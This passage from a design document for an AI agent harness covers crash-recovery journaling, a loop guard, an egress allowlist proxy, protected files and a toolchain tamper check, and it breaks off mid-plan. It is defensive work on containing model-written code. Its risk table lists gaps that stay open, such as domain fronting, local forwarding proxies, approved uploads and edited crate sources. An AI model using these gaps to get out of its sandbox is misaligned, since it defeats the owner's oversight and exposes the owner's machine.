    *   **Before a repair run,** the main process calls `toolchain::check` on the main store. On `Changed`, it does not start the run: it sets `triggers.state = setup_failed`, with the refusal text as the inbox note.
    *   **On `Trusted`,** it copies the baseline into the child's database, with `toolchain::export_baseline(&main_store) -> Result<String>` and `toolchain::import_baseline(&child_store, &str)`. So the child doesn't trust on first use whatever is installed.
    *   **After the child exits,** the main process calls `toolchain::check` on the main store again. A change made during the repair is posted to the main inbox, because the child's own notices are deleted with its home.
    *   A repair's own `cargo test` calls also go through the shell, so the refusal and the Seatbelt deny cover them too.

### 4. How each invariant is kept

*   **I1, the sandbox is on by default.**
    *   Nothing here adds a way to turn the sandbox off.
    *   `egress = "open"` only removes the IP rules and the proxy, and only the owner can set it, through the settings API.
    *   `sandbox::required()` and the refusal without Seatbelt (`src/tools/shell.rs:44-48`) are unchanged.
    *   The new rules only deny more.
*   **I2, a tainted conversation's grants never reach the shell.**
    *   The shell's read grants still come from `ctx.read_grants()`, which drops conversation grants once the conversation is tainted.
    *   An ask-again approval carries the taint of the original call. `run_parked` also re-reads the session's current taint for `shell`, the folder walks and `resume:` names (`src/app.rs:1793-1795`).
    *   A `resume:` entry gets the policy check like a tool, with the fixed effect `ProcessExec`. Its resumer receives the taint, and any tool work it does goes through `Agent::call_tool` with that taint ([§1.5](#15-the-ask-again-hook-the-interface-pre-5-names)).
    *   Egress decisions don't depend on grants.
*   **I3, "never" rules are lifted only in the app.**
    *   No "never" rule is touched.
    *   The three new owner-only actions use the same authenticated API as `DELETE /api/nevers`: widening egress, setting `egress = "open"`, and trusting the toolchain.
    *   The agent can't reach them:
        *   the file tools are refused `config.toml` and `heron.db` in both Heron homes, and the shell can't write them;
        *   the API token is never written where the sandbox can read it;
        *   no tool calls these routes.

        The API-port deny ([§3.2](#32-the-egress-allowlist)) is defence in depth only.
    *   An ask-again approval can't create an "always" rule. `run_parked` runs exactly one call.
*   **I4, memory never trusts outside content.**
    *   A re-run `remember` goes through `run_parked` with its recorded `tainted` flag, so it is saved as unconfirmed, as today (`src/app.rs:1788-1795`).
    *   A resumer gets the taint. If it saves a memory, it does so through `call_tool("remember", …)` with that taint, so the memory rule applies.
    *   The journal, protect and toolchain code write no memories.

## Alternatives Considered

### A1: Use the audit log as the journal

*   **Pros:** it is already tamper-evident (`audit_row`, `src/store.rs:1312`), and an "intent" audit row before each call would be one line.
*   **Cons:**
    *   audit arguments are cut to 600 characters and redacted, so a call can't be re-run from them;
    *   the table is append-only by trigger, so its state can't move to `asked`.
*   **Reason for rejection:** a re-run needs the full arguments and a state that changes. The audit log still records every journaled call when it finishes, as today.

### A2: Use the `approvals` table as the journal

*   **Pros:** it already has `running` and `unknown` states and the full arguments.
*   **Cons:** every side-effecting call would become an approval row, which floods the Approvals list and its count.
*   **Reason for rejection:** it mixes "asked the user" with "did something". The journal follows the `job_runs` pattern instead (`claim_due_job`, `recover_interrupted_jobs`) and creates an approval only when it must ask.

### A3: Recover by process id instead of lease files

*   **Pros:** no files.
*   **Cons:** process ids are reused, and checking one needs the start time, which differs between platforms.
*   **Reason for rejection:** an operating-system file lock is released on any death and is already the pattern in use (`background.lock`).

### A4: Keep `recent_calls` and add `RepeatGuard` beside it

*   **Pros:** the nudge's code stays as it is.
*   **Cons:** two checks would see the same calls, and they could disagree on what counts as "the same".
*   **Reason for rejection:** one history is enough. `RepeatGuard.same_call_count()` reproduces the nudge's count exactly, from the same name and arguments.

### A5: Seatbelt host rules, or a fixed IP list

*   **Pros:** no proxy to run.
*   **Cons:** Seatbelt accepts only `localhost` or `*` as a host, and IP lists for CDN-hosted registries change without notice.
*   **Reason for rejection:** nothing outside a proxy sees the host name.

### A6: A packet filter (`pf`) or a Network Extension content filter

*   **Pros:** they catch every process, not just those that honour proxy variables.
*   **Cons:**
    *   `pf` needs root, and its rules are system-wide;
    *   a content filter needs a signed system extension, a special entitlement and the owner's approval in System Settings, and it can't tell Heron's sandboxed commands from the owner's own.
*   **Reason for rejection:** each needs root or a signed system extension, and Seatbelt's loopback-only rule already makes the proxy the only exit.

### A7: Deny all network to sandboxed commands

*   **Pros:** no proxy, and no host list to keep.
*   **Reason for rejection:** `cargo test --locked` with a new dependency, `npm install` and `uv sync` all stop working, and Harness2's repair loop needs cargo.

### A8: A TLS-decrypting proxy that filters methods and paths

*   **Pros:** it could block `git push` and `npm publish` to allowed hosts (OQ5).
*   **Cons:**
    *   it needs a local certificate authority that every tool trusts;
    *   it breaks certificate pinning;
    *   it puts every credential the command sends through Heron in clear text.
*   **Reason for rejection:** it needs a certificate authority on the owner's Mac and puts credentials in clear text. `publish` commands already ask every time (`Privileged`, OQ5).

### A9: Make protected paths ask (`Privileged`) rather than refuse

*   **Pros:** "add this alias to my .zshrc" would still work, after one approval.
*   **Cons:** one misread approval puts code in a file that runs on every new shell.
*   **Reason for rejection:** OD5 says read-only. The owner edits these files himself.

### A10: Hash the whole toolchain before every command

*   **Pros:** no reliance on stat data.
*   **Cons:** about 1.2 GB per check, estimated at half a second or more for every shell command.
*   **Reason for rejection:** checking stat data first gives the same answer for any process that isn't root (OQ7 (g)).

### A11: Deny sandbox writes to the toolchains

*   **Pros:** there is nothing to check. It also closes the window in OQ1 for the owner's own builds.
*   **Cons:** a sandboxed `rustup` install or an auto-install from `rust-toolchain.toml` no longer works.
*   **Status:** not chosen by default, because OD7 keeps writes allowed. It is OQ1's recommendation, for the owner to decide with PT-T1's result.

--------------------------------------------------------------------------------

## Non-Functional Requirements

### Security and Privacy

*   **What a journal row holds.** Full arguments are kept only while a call is open. After that, only the hash and a redacted preview remain. Finished rows are deleted after 30 days.
*   **What the reports hold.** Notices and inbox entries name paths, hosts and tools, never file contents.
*   **No accepted-risk entry.** No new `## R-` entry is added to `docs/ACCEPTED_RISKS.md`, because that file is capped at 3 entries. These risks are threat-model notes. They go next to Harness2's HQ2 entry ("model-written code on the Mac"), which relies on this sandbox.

### Risks and mitigations

This table replaces the scattered lists. W7 copies each row into `docs/engineering/SECURITY_THREAT_MODEL.md`.

| Risk | Source | Mitigation or detector | Left open |
|---|---|---|---|
| Uploads to allowed hosts that accept writes (`git push`, `npm publish`) | OQ5 | `publish` asks every time; tainted conversations ask for every mutating call; `crates.io` is off the list | An approved upload, or a `git push` over HTTPS with a token the command holds |
| Domain fronting through a CDN-hosted allowed host | §3.2 | The SNI check | The HTTP `Host` header inside TLS is not checked, so a CDN that routes on it can reach another site |
| A local forwarding proxy (an HTTP debugger, `ssh -D`, a local model proxy) | OQ4 | `deny_local_ports` | Any forwarder on a port not in the list |
| A sandboxed command reaching a daemon through a system service | PT-E1 | #79's socket rules; the egress socket denies; PT-E1's service tests | A mach service PT-E1 did not try |
| A replaced toolchain run by the owner's own tools before the notice is read | OQ1 | The after-command check and notice; the read deny for Heron's commands | The window until the owner reads the notice, unless OQ1's stronger option is chosen |
| Edited crate sources in `~/.cargo/registry/src` or `~/.cargo/git/checkouts` | OQ2 | None | Run by the owner's next unsandboxed build |
| Build inputs in the working folder (`build.rs`, `.cargo/config.toml`, `package.json`) | Non-Goals | None: writing them is the agent's normal work | Run by the owner's next build |
| Hard links to a protected file | PT-P1 | Seatbelt, if PT-P1 shows it refuses them; otherwise the rehash | A change between runs, which the rehash doesn't see |
| The config of a repository made during the run | OQ7 (e) | The rehash | The change is made before it is reported |
| A protected file changed between two runs | §3.3 | None | Not reported |
| A command running at the same time as the one that changed the toolchain | G7 | The next check | That command uses the changed toolchain |
| Heron's API reached from the sandbox | OQ4 | The token; the port deny | A server in another process on a fallback port, which still needs the token |
| A CLI provider that runs its own shell under `cli_allow_agent_tools` (cline-cli, goose-cli) | Non-Goals | The Cli profile writes only its run folder (`src/sandbox.rs:402`) | Its network is open (`docs/cli-providers.md:102-109`) |
| Power loss between a tool's effect and its intent commit | §1.3 | `synchronous=FULL` | macOS `fsync` is not `F_FULLFSYNC` |

### Performance

*   **Journal:** two small commits per mutating call. Read-only calls are unchanged.
*   **Protect:** one bounded scan for each shell command, plus one snapshot at a run's first mutating call and one at its end. A typical project folder is expected to take milliseconds. The cap is 100,000 entries.
*   **Toolchain:** about 300 stat calls before and after each sandboxed shell command.
*   **Egress:** one loopback listener for each shell command.

### Rollout and Rollback

*   **The data format.** Step 4 only adds a table. An older build refuses a newer database, as it does today.
*   **Switches that roll back:** `egress = "open"` and `max_repeats = 0`.
*   **No switch:** the journal, protected paths and the toolchain check have none. Each only adds asks or refusals, and removing one weakens a stated goal.

--------------------------------------------------------------------------------

## Additional Resources

*   **Harness research:** `00-synthesis.md` and `A-harness2-vs-heron.md` (2026-11-22). They are in the owner's harness research folder, not in this repository.
*   **anchor-harness** (`~/Documents/PERSONAL/anchor-harness`, at `daed7ef`):
    *   `crates/harness-core/src/effects.rs`;
    *   `crates/harness-core/src/repeats.rs`;
    *   `crates/harness-runtime/src/protect.rs`, `proxy.rs` and `sandbox.rs`;
    *   its genesis claims `evals/genesis/egress-claim` and `protection-claim`. These are anchor's own evaluator claims for the ported code; they are cited as evidence, not re-run here.
*   **[heron-harness2.md](heron-harness2.md)** (on `main`, read at `e1ecd19`): "Harness parts from the review session's design", "When a run fails", §2 "The repair run" and Pre-5. Harness2 calls these parts "PR #73", the review session's name for this work.

## Future Improvements

*   **A separate `CARGO_HOME` registry for sandboxed commands** (OQ2). It closes the `registry/src` and `git/checkouts` routes to the owner's builds.
*   **Egress rules on Linux.** These would use anchor-harness's bubblewrap network namespace and proxy bridge.
*   **A per-host approval** ("allow `gitlab.com` for this command"). It would be for untainted conversations only, and never saved from an approval.
*   **Egress for the CLI provider children,** with the provider's API hosts as their allowlist.
*   **A Host-header check for domain fronting,** which would need TLS decryption ([A8](#a8-a-tls-decrypting-proxy-that-filters-methods-and-paths)).

--------------------------------------------------------------------------------

## Detailed Implementation Plan

### Pre-steps (the build session, before `skein run`)

*   **Pre-S0, the base.**
    *   Merge #75 to #79 into `main` first, or rebase this branch onto them. The design relies on their behaviour wherever it says "after #NN".
    *   Rebase this branch onto `origin/main`, so that `docs/designs/heron-harness2.md` (#74) is in every node's worktree.
    *   Fast-forward the local `main` to `origin/main` (`git fetch origin main:main`), so that verify's `testteeth run --base main` grades only this branch. On 2026-11-23 the local `main` was at `bf7f7f0`, behind `origin/main`.
*   **Pre-S1, the skeleton.** One commit, so that parallel units never edit the same shared file. Its check is `cargo test --locked && cargo build --locked --features desktop --bins`, run unsandboxed.
    *   **`src/lib.rs`:** `pub mod journal; pub mod repeat; pub mod egress; pub mod protect; pub mod toolchain;`.
    *   **Stub files:** `src/journal/mod.rs`, `sql.rs` and `lease.rs`; `src/repeat/mod.rs`; `src/egress/mod.rs` and `proxy.rs`; `src/protect/mod.rs` and `scan.rs`; `src/toolchain/mod.rs`. Each is empty except for two:
        *   **`src/journal/sql.rs`** holds the `effects` table as `pub fn step(conn: &Connection) -> Result<()>`, which fits `type Step` (`src/store.rs:187`). It has the columns of [§1.2](#12-the-record), plus indexes on `state` and on `(session_id, name, args_hash)`.
        *   **`src/egress/mod.rs`** holds `pub const DEFAULT_ALLOW: &[&str]`: §3.2's list, plus any host PT-E2 found.
    *   **`src/store.rs`:**
        *   `to_v4` in `STEPS`, pointing at `journal::sql::step`;
        *   re-pin `the_schema_cannot_change_without_a_new_version` (`src/store.rs:2073`) to version 4 and the new fingerprint. The version-3 assertion in `to_v3_adds_columns_and_keeps_rows` (`src/store.rs:2040`) changes so that it still checks step 3;
        *   a new test, `to_v4_adds_effects_and_keeps_rows`;
        *   `pub(crate) fn with_conn<T>(&self, f: impl FnOnce(&mut Connection) -> Result<T>) -> Result<T>`. Its doc comment states the rule that the closure never calls a `Store` method. `Store::db()` stays private (`src/store.rs:778`);
        *   `reopen_approval(id, summary, detail) -> Result<bool>`, which runs `UPDATE approvals SET status='new', summary=?, detail=? WHERE id=? AND status='running'`, with the test `reopen_approval_sets_running_back_to_new`;
        *   `dismiss_approval(id) -> Result<bool>`, the claim of [§1.5](#15-the-ask-again-hook-the-interface-pre-5-names), with the test `dismiss_approval_wins_only_while_new`.
    *   **`src/config.rs`:** the new `AgentConfig` fields `max_repeats: u32` (4), `egress: String` (`"allowlist"`), `egress_allow: Vec<String>` (`DEFAULT_ALLOW`) and `deny_local_ports: Vec<u16>` (empty).
        *   Validation: `max_repeats` is 0 or at least 2; `egress` is one of its two values; hosts and ports follow §3.2.
        *   The test is `agent_safety_settings_are_validated`.
    *   **`src/util.rs`:** `pub fn sha256_hex(bytes: &[u8]) -> String`, moved from `content_hash` (`src/tools/fs.rs:63`), which now calls it.
    *   **`src/sandbox.rs`:** `subpaths`, `literals`, `both_forms` and `data_volume_alias` become `pub(crate)` (`src/sandbox.rs:211-277`), so W4 emits the `/System/Volumes/Data` form of each path.
*   **Pre-S2, the prototypes.** Run PT-E1, PT-E2, PT-P1, PT-P2 and PT-T1 unsandboxed. Commit their output under [Prototype results](#prototype-results), and any extra host into `DEFAULT_ALLOW`, before `skein run`. A node's worktree doesn't see commits made after the node starts. What each result changes:
    *   **PT-E1 fails:** stop phase 2 (W3 and W6b), and revise §3.2. Phase 1 goes on.
    *   **PT-P1 shows Seatbelt allows hard links:** the Risks row already covers it, and W7 copies it.
    *   **PT-P2's `git init` fails:** narrow the hooks deny, as PT-P2 says, in §3.1 before W4 starts.
    *   **PT-T1:** its result goes to OQ1. The owner answers OQ1 before W5 starts. If the owner picks the stronger option, W5 and its W6a tests leave the graph, and §3.4 is dropped.
*   **Pre-S3, how skein runs the checks.**
    *   Every node uses the `claude_build_rust` backend, except W8, which uses `claude_build_swift`. Both were registered for heron-v1 (`heron-v1.md:822`).
    *   skein runs each node's completion command itself, in the node's worktree, not through the agent's tool allowlist (`heron-v1.md:823`).
    *   Several checks bind loopback ports, run `sandbox-exec` or run `swift`, and those fail inside Claude Code's Bash sandbox. So the build session starts `skein run` with that sandbox off for that one command, with the owner's approval, and says so in the PR description. The run notes call this process "the supervisor".
    *   It is not established whether completion commands escape the sandbox when `skein run` starts inside it. This step avoids depending on that.

### Target Files to Create/Modify

#### 1. `src/journal/mod.rs`, `src/journal/sql.rs`, `src/journal/lease.rs` (Create, W1)

*   **Type / Scope:** Rust module.
*   **Proposed changes:**
    *   **`sql.rs`:** the step from Pre-S1, unchanged, plus plain functions over `&Connection`:
        *   `insert_intent(conn, &Intent, proc) -> Result<i64>`;
        *   `write_outcome(conn, id, state, outcome)`, which sets the state, the outcome and `finished_at`, and clears `args`;
        *   `open_procs(conn) -> Result<Vec<String>>`;
        *   `mark_interrupted(conn, proc) -> Result<usize>`;
        *   `unasked(conn) -> Result<Vec<Interrupted>>`;
        *   `set_asked(conn, id, approval_id)`, which also clears `args`;
        *   `pending_ask_again(conn, session_id, name, args_hash) -> Result<bool>`: an `asked` row whose approval is still `new`;
        *   `row_for_approval(conn, approval_id) -> Result<Option<EffectRow>>`;
        *   `close_asked(conn, approval_id, state)`, which moves an `asked` row to `rerun` or `dismissed`;
        *   `prune(conn, older_than)`.
    *   **`lease.rs`:**
        *   `proc_id() -> &'static str`, made once per process;
        *   `Lease::acquire(heron_home) -> Result<()>`, which holds the lock in the process-wide map keyed by Heron home;
        *   `Lease::is_dead(heron_home, proc) -> bool`, which is true when the file is missing or `try_lock` succeeds.
    *   **`mod.rs`:**
        *   **Types:**
            *   `Intent { kind, name, args, args_hash, summary, risk, tainted, session_id, run_id, origin, workspace, label }`;
            *   `ActionIntent`, as in §1.5;
            *   `Outcome { Done, Failed(String) }`;
            *   `Interrupted`, a row read for asking again;
            *   `EntryId = i64`.
        *   `guarded(store, heron_home, intent, limit, fut) -> Result<String>`, as in [§1.3](#13-one-helper-on-both-execution-paths);
        *   `begin_action` and `finish`;
        *   `recover(store, heron_home) -> Result<usize>`, both passes of [§1.4](#14-recovery-and-telling-a-live-process-from-a-dead-one). Its `ask_again(store, &Interrupted) -> Result<i64>` calls `park_approval` or `reopen_approval` outside `with_conn`;
        *   the `Resumer` trait, with `#[async_trait]`;
        *   `register_resumer` and `resumer(name)`;
        *   `args_hash`, which is canonical JSON, then `util::sha256_hex`;
        *   `pending_ask_again(store, session_id, name, args_hash) -> bool`;
        *   `workspace_for(store, approval_id) -> Option<PathBuf>`;
        *   `answered(store, approval_id, Answer::Rerun | Answer::Dismissed)`, which calls `close_asked` so that answered rows can be pruned.

    It reaches the database only through `Store::with_conn` and the `Store` methods named in Pre-S1. The unit tests use `Store::in_memory()` and a temporary folder as the Heron home.
*   **Tests:**
    *   `dead_process_intent_becomes_interrupted`
    *   `missing_lease_file_counts_as_dead`
    *   `a_live_process_intent_is_left_alone`
    *   `finished_rows_drop_their_arguments`
    *   `dropped_future_writes_cancelled`
    *   `timeout_inside_guarded_writes_failed`
    *   `interrupted_tool_call_becomes_one_ask_again_approval`
    *   `ask_pass_is_idempotent_after_a_crash_before_set_asked`
    *   `interrupted_parked_call_reopens_its_own_approval`
    *   `interrupted_action_uses_its_label`, which asserts the exact text "Repair #12 was interrupted. Run again?"
    *   `pending_ask_again_matches_session_tool_and_args`
    *   `args_hash_ignores_key_order`
    *   `prune_keeps_open_rows`
    *   `answered_ask_again_rows_close_and_prune`

#### 2. `src/repeat/mod.rs` (Create, W2)

*   **Type / Scope:** Rust module, ported from anchor-harness `repeats.rs` at `daed7ef`.
*   **Proposed changes:**
    *   **Types:** `RepeatGuard` and `Stop`, plus the constants `DEFAULT_LIMIT = 4` and `MAX_PERIOD = 3`.
    *   **Methods:** `observe`, `same_call_count`, `mask_digits`, `stop_text(&Stop, limit) -> String`, and `is_failure(tool, text) -> bool`, which is [§2](#2-u2-the-loop-guard)'s rule.
    *   The fingerprint is built on `util::sha256_hex` and canonical JSON.
*   **Tests:** anchor's tests except `state_survives_serialization`, ported: `identical_calls_stop_at_the_limit`, `any_difference_resets_the_count`, `limit_zero_disables_and_one_stops_immediately`, `a_repeating_block_of_calls_is_a_loop` and `failures_that_differ_only_in_digits_are_repeats`. The guard itself still stops at a limit of 1; config refuses that value. New:
    *   `same_call_count_is_three_after_three_identical_calls`
    *   `same_call_count_ignores_results`
    *   `shell_exit_code_line_counts_as_failure`
    *   `shell_timeout_counts_as_failure`
    *   `stop_text_uses_one_template`

#### 3. `src/egress/mod.rs`, `src/egress/proxy.rs` (Create, W3)

*   **Type / Scope:** Rust module, ported from anchor-harness `proxy.rs` at `daed7ef`.
*   **Proposed changes:**
    *   **`proxy.rs`:** anchor-harness `proxy.rs`, without its per-host caps and its unix-socket bridge for Linux:
        *   `pub async fn start(allow: Vec<String>) -> std::io::Result<EgressProxy>`. anchor's is `start(allow, caps)` (`proxy.rs:319`);
        *   `EgressProxy { port: u16 }`, with `decisions() -> Vec<Decision>`, where a refused `Decision` carries its reason: not listed, not public, server-name mismatch, or not a CONNECT to 443;
        *   `host_allowed`;
        *   the public-address check;
        *   the SNI check;
        *   CONNECT to port 443 only.
    *   **`mod.rs`:**
        *   `seatbelt_rules(deny_ports: &[u16], user_home) -> String`, the rules of [§3.2](#32-the-egress-allowlist), which are plain text;
        *   `proxy_env(port) -> Vec<(String, String)>`;
        *   `blocked_note(&[Decision]) -> Option<String>`;
        *   `validate_host(&str) -> Result<()>`;
        *   `DEFAULT_ALLOW`, from Pre-S1.
*   **Tests:**
    *   **Kept from anchor (11):** `decisions`, `head_parsing`, `refuses_disallowed_tunnels_over_the_wire`, `wildcard_needs_a_real_label_and_ips_are_refused_even_if_listed`, `dropping_the_proxy_closes_its_port`, `oversized_request_head_is_dropped`, `sni_is_read_from_a_client_hello`, `client_hello_parser_edges`, `only_public_addresses_are_reachable`, `allowlisted_names_resolving_to_internal_addresses_are_refused`, `the_tls_server_name_must_match_the_connect_host`.
    *   **Dropped (4):** `every_cap_must_match_as_well_as_the_allowlist` and `capped_host_is_refused_over_the_wire` (caps), and `the_unix_listener_applies_the_same_rules` and `the_bridge_forwards_a_loopback_port_and_returns_the_exit_code` (the bridge).
    *   **New:**
        *   `rules_deny_outbound_ip_except_loopback`
        *   `deny_local_port_overrides_loopback`
        *   `resolver_socket_is_denied_after_the_local_socket_rules`
        *   `daemon_sockets_are_denied`
        *   `blocked_hosts_are_named_once_with_their_reason`
        *   `default_list_excludes_crates_io`
        *   `host_entries_are_validated`

    The tests that bind loopback ports sit in a submodule, `egress::proxy::net`. The node agent runs `cargo test --locked --lib -- egress:: --skip egress::proxy::net`, and the supervisor runs them all.

#### 4. `src/protect/mod.rs`, `src/protect/scan.rs` (Create, W4)

*   **Type / Scope:** Rust module, ported whole from anchor-harness `protect.rs` at `daed7ef`.
*   **Proposed changes:**
    *   **`mod.rs`:**
        *   **Constants from anchor:** `WORKSPACE_NAMES`, `GIT_PARTS`, `NEW_REPO_CONFIG_KEYS` with the allowed `branch.*` and `remote.*` keys, and `CLAUDE_HOME_ITEMS` (used only if the owner accepts OQ10).
        *   **New constants:** `HOME_PATHS` and `HERON_FILES`.
        *   `is_protected(path, workspace, user_home, heron_homes) -> Option<&'static str>`, which returns the label shown to the user;
        *   `has_git_component(path) -> bool`;
        *   `seatbelt_rules(workspace, user_home, heron_homes, &Scan, writable: &[PathBuf]) -> (String, Vec<PathBuf>)`;
        *   `regex_escape`;
        *   `Snapshot::take(workspace, user_home, heron_homes) -> Snapshot`, and `Snapshot::diff(&self, later: &Snapshot) -> Vec<ProtectedChange>`;
        *   `report_text(&[ProtectedChange]) -> String`.
    *   **`scan.rs`:** `scan(workspace) -> Scan`, including how a `.git` file is resolved.
    *   **Windows.** anchor's `digest_into` reads the execute bits through `std::os::unix::fs::PermissionsExt` (`protect.rs:193`). The port puts that under `#[cfg(unix)]`, and on Windows records the hash only, so the Windows build keeps compiling (G8).
    *   **The types:** `Scan { repos: Vec<Repo>, truncated: bool }`, `Repo { git_dir, common_dir }`, `Snapshot`, and `ProtectedChange { path, kind }`. The kind is `Changed`, `New`, `Deleted`, `NewRepository` or `ScanTruncated`. Each derives `Debug`, `Clone` and `Default`, because `Profile` derives `Debug` and `Clone` (`src/sandbox.rs:69`).
*   **Tests:** anchor's `protect.rs` tests, ported: `scan_finds_repos_and_names_at_any_depth_but_skips_big_dirs`, `file_tools_refuse_protected_names_and_git`, `apply_protects_existing_repos_and_names`, `snapshots_see_changes_to_protected_entries_only`, `a_new_repository_may_hold_only_samples_and_plain_config`, `claude_home_items_and_mcp_servers_are_snapshotted`, `git_config_keys_are_parsed`, `git_config_keys_on_the_header_line_are_seen`, and the macOS-only `a_quote_in_a_repo_path_keeps_the_profile_valid`. New:
    *   `protected_names_match_at_any_depth`
    *   `git_file_resolves_to_common_dir`
    *   `git_component_in_a_write_path_is_protected`
    *   `new_repo_with_sample_hooks_is_not_a_change`
    *   `cloned_repo_with_branch_and_remote_keys_is_not_a_change`
    *   `new_repo_with_hooks_path_is_a_change`
    *   `default_heron_home_files_are_protected_when_heron_home_is_overridden`
    *   `heron_home_folder_itself_is_not_protected`
    *   `rules_return_repo_paths_for_refused_ancestors`
    *   `hooks_rule_allows_sample_names`
    *   `workspace_path_is_escaped_in_rules`
    *   `home_rules_only_cover_paths_inside_writable_folders`
    *   `scan_stops_at_the_limit_and_says_so`
    *   `truncated_scan_is_a_change`
    *   `snapshot_leaves_out_heron_db_and_leases`
    *   `snapshot_diff_reports_paths_only`

#### 5. `src/toolchain/mod.rs` (Create, W5, unless OQ1's stronger option is chosen)

*   **Type / Scope:** Rust module.
*   **Proposed changes:**
    *   `Manifest::scan(user_home)`;
    *   `check(store, user_home) -> ToolchainState`;
    *   `trust_current(store, user_home)`;
    *   `names_rust_tool(command) -> bool`;
    *   `seatbelt_denies(&ToolchainState, user_home) -> String`;
    *   `note_after(store, before, after, command) -> Option<String>`;
    *   `export_baseline(store) -> Result<String>` and `import_baseline(store, &str) -> Result<()>`.

    The baseline lives in kv `toolchain:baseline`, through the public `kv_get` and `kv_set`. The stat code is `#[cfg(unix)]`, and on Windows `check` returns `Trusted`.
*   **Tests:**
    *   `changed_binary_is_reported`
    *   `libexec_change_is_reported`
    *   `touch_without_content_change_stays_trusted`
    *   `new_toolchain_folder_is_a_change`
    *   `rust_src_and_docs_are_ignored`
    *   `names_rust_tool_finds_cargo_after_a_pipe`
    *   `names_rust_tool_skips_env_and_assignments`
    *   `changed_toolchain_is_read_denied`
    *   `no_baseline_adds_no_denies`
    *   `change_is_noticed_once`
    *   `trust_current_makes_state_trusted`
    *   `exported_baseline_imports_into_another_store`

    These tests use a fake home in a temporary folder.

#### 6. `src/store.rs` (Modify, W6a)

*   **Proposed changes:** `maintain()` drops its `self.db()` guard (`src/store.rs:759`) before it calls `journal::sql::prune(30 days)` through `with_conn`. Calling `with_conn` while holding the guard would deadlock. Everything else in this file is done in Pre-S1.
*   **Tests:** `maintain_prunes_finished_rows_after_30_days`.

#### 7. `src/agent.rs` (Modify, W6a and W6b)

*   **Proposed changes, W6a:**
    *   Add `RunFrame`, the task-local `RUN`, and `in_run(frame, fut)` ([the run frame](#the-run-frame)). `run_turn` at depth 0 opens a frame when none is set.
    *   In `execute_call`, for a mutating call:
        *   when `journal::pending_ask_again` matches, an `Allow` becomes `Ask` (OQ9);
        *   the frame takes its snapshot on its first mutating call;
        *   `tool.call` is wrapped in `journal::guarded`, which now owns the timeout.
    *   Fill `Call::refusal` from `tool.protected(&args, ctx)`.
    *   Replace `recent_calls` with `RepeatGuard`. The nudge stays at `same_call_count() >= 3`. On a stop, it sends the notice and goes to the closing call with the stop notice.
    *   Change `repair_transcript`'s inserted text ([§1.4](#14-recovery-and-telling-a-live-process-from-a-dead-one)).
*   **Proposed changes, W6b:** `in_run`'s end runs the protect comparison and the report ([§3.3](#33-the-after-run-rehash)).
*   **Tests, W6a:**
    *   `alternating_two_call_loop_stops_the_turn_with_a_notice`
    *   `failing_shell_call_with_changing_digits_stops`
    *   `changing_success_output_does_not_stop`
    *   `max_repeats_zero_keeps_only_the_nudge`
    *   `mutating_call_writes_intent_before_running`
    *   `read_only_call_writes_no_journal_row`
    *   `delegate_child_shares_the_run_frame`
    *   `automation_calls_share_the_job_run_frame`
    *   `repaired_transcript_says_the_call_may_have_finished`
    *   `identical_call_asks_while_its_ask_again_waits`
*   **Tests, W6b:**
    *   `protected_change_during_turn_is_reported_once`, which asserts the notice, the inbox entry and the audit row
    *   `protected_change_in_an_automation_is_reported`

#### 8. `src/app.rs` (Modify, W6a and W6b)

*   **Proposed changes, W6a:**
    *   `own_background_work`: call `journal::recover` before `recover_interrupted_approvals`.
    *   `scheduler_loop`: call `journal::recover` on each tick, inside `if self.own_background_work()`.
    *   `run_parked`:
        *   it opens the frame `parked:<id>`;
        *   it handles `resume:` names in the order of [§1.5](#15-the-ask-again-hook-the-interface-pre-5-names), and `sees_conversation_grants` gains them;
        *   it refuses a re-run when the working folder differs;
        *   it wraps the call in `journal::guarded`;
        *   when the approval has an `asked` effects row, it calls `journal::answered(…, Rerun)` once it has claimed the approval.
    *   `run_job` and `run_automation`: open the `job:…` frame.
*   **Proposed changes, W6b:** none beyond the frame, whose end now runs the comparison.
*   **Tests, W6a:**
    *   `crash_mid_call_asks_again_after_restart`, which simulates the crash by dropping the lease and leaving the intent
    *   `crashed_job_call_asks_again_with_its_job_run_id`
    *   `ask_again_rerun_rechecks_current_policy`
    *   `ask_again_keeps_the_original_call_taint`
    *   `ask_again_in_another_workspace_is_blocked`
    *   `run_again_on_resume_approval_calls_rerun`
    *   `resume_approval_is_blocked_in_read_only_mode`
    *   `resume_approval_passes_current_taint_to_rerun`
    *   `unknown_resumer_sets_failed_with_unknown_handler_text`
    *   `interrupted_parked_approval_is_asked_once`
    *   `tick_recovery_runs_only_in_the_background_owner`
*   **Tests, W6b:** `protected_change_in_run_parked_is_reported`.

#### 9. `src/permissions.rs` (Modify, W6a)

*   **Proposed changes:**
    *   In `classify_path`, when `write` is true and `protect::is_protected` or `protect::has_git_component` matches any form of the path, return `Refused`.
    *   `Call` gains `refusal: Option<&'static str>`, and every `Call { … }` literal gains `refusal: None`.
    *   `Tool` gains `fn protected(&self, args, ctx) -> Option<&'static str>`. It returns `None` by default, and the writing file tools in `src/tools/fs.rs` set it.
    *   `decide`'s Refused branch uses the protected-file message when `refusal` is set.
*   **Tests:**
    *   `git_hook_write_is_refused_in_every_mode`
    *   `envrc_in_a_subfolder_is_refused`
    *   `zshrc_write_is_refused_not_asked`
    *   `write_through_a_git_component_is_refused`
    *   `refusal_names_the_protected_category`
    *   `protected_read_is_unchanged`

#### 10. `src/sandbox.rs` (Modify, W6a and W6b)

*   **Proposed changes:**
    *   **W6a.** `Profile::Shell` gains:
        *   `protect: protect::Scan`;
        *   `egress: Option<EgressRules>`, where `EgressRules { deny_ports: Vec<u16> }`;
        *   `toolchain: ToolchainState`.

        Their defaults are `Scan::default()`, `None` and `ToolchainState::Trusted`. Every construction gains them: `src/sandbox.rs:369`, `439`, `738` and `808`, and `src/tools/shell.rs:44`, `684`, `768`, `841`, `1028` and `1079`. In `seatbelt_profile`, the `Shell` branch appends `toolchain::seatbelt_denies` before `launch`.
    *   **W6b.** The `Shell` branch inserts `protect::seatbelt_rules` right after the writable allowance (`src/sandbox.rs:388`), before the Refused and secret denies, and `refused_ancestors` over the protected paths after them. It appends the egress rules, when `Some`, after #79's `local_sockets` and before `launch`.
    *   The `Cli` branch is unchanged.
*   **Tests, W6a:** `changed_toolchain_is_denied_in_the_profile`, `cli_profile_has_no_egress_rules`.
*   **Tests, W6b:** `shell_profile_denies_protected_writes_after_the_writable_allowance`, `egress_off_leaves_network_rules_out`, `egress_rules_come_after_local_socket_rules`.

#### 11. `src/server.rs` (Modify, W6a and W6b)

*   **Proposed changes, W6a:**
    *   `GET /api/toolchain` returns the state. `POST /api/toolchain/trust` calls `trust_current` and returns the new state:

        ```json
